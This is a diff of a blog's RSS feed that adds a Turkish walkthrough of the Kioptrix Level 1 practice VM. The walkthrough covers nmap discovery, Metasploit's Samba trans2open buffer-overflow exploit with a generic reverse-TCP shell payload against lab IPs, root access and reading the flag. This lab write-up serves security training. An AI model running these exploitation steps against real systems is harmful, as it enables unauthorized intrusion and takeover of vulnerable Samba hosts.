@@ -6,9 +6,101 @@
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
     <description></description>
     <language>en-us</language>
-    <pubDate>Fri, 21 Apr 2017 20:35:30 +0300</pubDate>
-    <lastBuildDate>Fri, 21 Apr 2017 20:35:30 +0300</lastBuildDate>
+    <pubDate>Wed, 26 Apr 2017 13:42:20 +0300</pubDate>
+    <lastBuildDate>Wed, 26 Apr 2017 13:42:20 +0300</lastBuildDate>
 
+    
+      <item>
+        <title>Kioptrix Level 1 Çözüm</title>
+        <link>http://localhost:4000/kioptrix-level-1</link>
+        <pubDate>Wed, 26 Apr 2017 00:00:00 +0300</pubDate>
+        <author></author>
+        <description>&lt;p&gt;      &lt;strong&gt;Kioptrix&lt;/strong&gt;, içerisindeki çeşitli zafiyetleri istismar ettiğimiz, bunlar sayesinde erişimler elde 
+edebildiğimiz ve bu şekilde sistemi ele geçirmeye çalıştığımız bir sanal makine uygulamasıdır.
+Bu yazımızda Kioptrix &lt;strong&gt;Level 1&lt;/strong&gt; sanal makinesi çözümünü yapacağız. Sanal makineyi &lt;a href=&quot;http://www.kioptrix.com/blog/test-page/&quot;&gt;şu&lt;/a&gt; bağlantı 
+üzerinden indirebilirsiniz.&lt;/p&gt;
+
+&lt;p&gt;      Öncelikle sanal makinenın ağ üzerinde hangi ip adresini aldığını öğrenmek için &lt;strong&gt;nmap&lt;/strong&gt; aracıyla
+genel bir ağ taraması yapıyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sV -T4 192.168.0.0/24
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/kioptrix/hedef-tespiti.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Bu ağ taraması sonucuna göre Kioptrix Level 1 sanal makinasının aldığı ip adresi 192.168.0.22 olarak
+görünüyor. Bu bilgiyi kullanarak şimdi açık portları tespit etmek için başka bir tarama yapacağız.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sV -T4 192.168.0.22 --open
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/kioptrix/hedef-tarama.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Bu işlem sonucunda açık olan portları aşağıdaki gibi listeliyoruz.  &lt;strong&gt;Netbios-ssn&lt;/strong&gt; servisi
+üzerinden işlem yapmaya çalışacağız. Burada sambanın bu sürümünde bulunan &lt;strong&gt;arabellek taşması(buffer overflow)&lt;/strong&gt;
+açığı istismar edilecektir.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;139/tcp&lt;/td&gt;
+      &lt;td&gt;open&lt;/td&gt;
+      &lt;td&gt;netbios-ssn&lt;/td&gt;
+      &lt;td&gt;Samba smbd (workgroup: MYGROUP)&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;      &lt;strong&gt;Metasploit Framework&lt;/strong&gt; üzerinde &lt;strong&gt;exploit&lt;/strong&gt; aramaya başlıyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf&amp;gt; search samba
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/kioptrix/search-exploit.jpeg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Burada listelenen çözümlerden sistemimiz ile ilgili olan seçiyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf&amp;gt;  use exploit/linux/samba/trans2open
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;      Bu aşamada kullandığımız exploit sayesinde samba servisi açığından yararlanabiliyoruz fakat
+hedef sistem üzerinde bir kontrol elde edemiyoruz. Burada hedef sisteme sızmayı sağlayan ve 
+istediğimiz işlemleri gerçekleştirmemizi sağlayan &lt;strong&gt;payload&lt;/strong&gt;lardan birini kullanmamız gerekiyor.
+Uygun olabilecek payloadları aratıyoruz ve buradan &lt;strong&gt;reverse_tcp&lt;/strong&gt; seçimini yapıp hedefe karşı bir
+reverse shell uygulaması yapacağız. Hedefin tepkisi sonucu terminalden bir reverse shell bağlantısı
+kurulacak. Sonrasında eklememiz gereken parametreleri görmek ve eklemek için aşağıdaki adımları
+uyguluyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf&amp;gt; show payloads
+msf&amp;gt; set PAYLOAD generic/shell_reverse_tcp
+msf&amp;gt; options
+msf&amp;gt; set RHOST 192.168.0.18
+msf&amp;gt; set LHOST 192.168.0.14
+msf&amp;gt; run
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/kioptrix/search-payload.jpeg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/kioptrix/options.jpeg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/kioptrix/root-erisim.jpeg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Belli bir süre devam eden işlem sonucunda hedefe root erişimi sağlıyoruz. Artık içeride 
+bulunmak istenen mesajı aramaya başlıyoruz. Önemli gördüğümüz dizinler arasında dolanırken
+gözümüze &lt;strong&gt;var&lt;/strong&gt; dizini takılıyor . Buraya girdiğmizde &lt;strong&gt;mail&lt;/strong&gt; adlı bir dosya daha görüyoruz. Bunun da
+içerisine girdiğmizde dosya tipi &lt;strong&gt;ASCII mail text&lt;/strong&gt; olan ‘&lt;strong&gt;root&lt;/strong&gt;’ adlı bir dosya görüyoruz. Bunu 
+okuduğumuzda bu  makinenin &lt;strong&gt;FLAG&lt;/strong&gt; değerine ulaşıyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/kioptrix/sonuc1.jpeg&quot; /&gt;
+&lt;img src=&quot;/img/kioptrix/sonuc2.jpeg&quot; /&gt;&lt;/p&gt;
+
+</description>
+      </item>
     
       <item>
         <title>Thread-MultiThreading Örneği (C)</title>
